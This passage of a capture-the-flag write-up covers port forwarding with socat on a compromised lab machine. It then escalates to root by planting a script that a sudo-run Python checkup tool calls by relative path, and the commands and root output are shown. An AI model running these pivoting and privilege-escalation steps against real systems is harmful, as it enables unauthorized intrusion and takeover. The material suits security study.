- Based on the information above, there are 2 docker container running on localhosts at port 3000 and 3306.
- We could try to port forward it and access into the docker.
- I would like to use SSH port forwarding but since im using WSL, i am not perform ssh port forwarding.
- Instead i will use [**socat**](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) to perform something similar. For more info, click [here](https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-socat/).
- First will be upload the file into the victim machine.
- Next, type to following command to forward the port.

```bash
./socat tcp-listen:1234,fork,reuseaddr tcp:localhost:3000
```

- Although we have no access to perform anything, we are able to read the code of the scripts and we managed to spot one mistake.
- According to the code, the command is running `./full-checkup.sh` which mean we could write our own `full-checkup.sh` file anywhere and trigger the code in the same directory.

```bash
svc@busqueda:~$ cat full-checkup.sh
#!/bin/bash


whoami
svc@busqueda:~$ sudo  /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
root

[+] Done!
```

- Now we managed to run the command as root.
- Remaining part will be just getting root shell and flag.

## Things I learn today

- **Searchor 2.4** RCE
- Port forwarding with **socat**
- Check for password in different config file
- always use absolute path to avoid relative path overwrite attack
